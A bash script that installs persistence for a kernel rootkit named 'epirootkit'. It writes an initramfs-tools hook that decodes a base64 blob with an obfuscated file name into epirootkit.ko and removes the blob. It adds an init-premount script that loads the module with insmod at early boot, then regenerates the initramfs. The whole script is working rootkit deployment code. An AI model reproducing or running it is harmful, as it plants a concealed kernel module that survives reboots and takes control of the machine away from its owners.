#!/usr/bin/env bash
set -e

BLOB_SRC="/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

HOOK_DIR="/etc/initramfs-tools/hooks"
HOOK_PATH="$HOOK_DIR/epirootkit"
mkdir -p "$HOOK_DIR"
cat > "$HOOK_PATH" << 'EOF'
#!/bin/sh
set -e

PREREQ=""
prereqs() { echo "$PREREQ"; }
case "$1" in
  prereqs) prereqs && exit 0 ;;
esac

mkdir -p "${DESTDIR}/sbin"
ln -s /bin/kmod "${DESTDIR}/sbin/insmod"

mkdir -p "${DESTDIR}/lib/epirootkit"
install -m644 /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"

base64 -d "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv" > "${DESTDIR}/lib/epirootkit/epirootkit.ko"
rm -f "${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv"
EOF

chmod +x "$HOOK_PATH"

LOAD_DIR="/etc/initramfs-tools/scripts/init-premount"
LOAD_PATH="$LOAD_DIR/epirootkit-load"
mkdir -p "$LOAD_DIR"
cat > "$LOAD_PATH" << 'EOF'
#!/bin/sh
set -e
/sbin/insmod /lib/epirootkit/epirootkit.ko
EOF

chmod +x "$LOAD_PATH"

update-initramfs -u -k "$(uname -r)"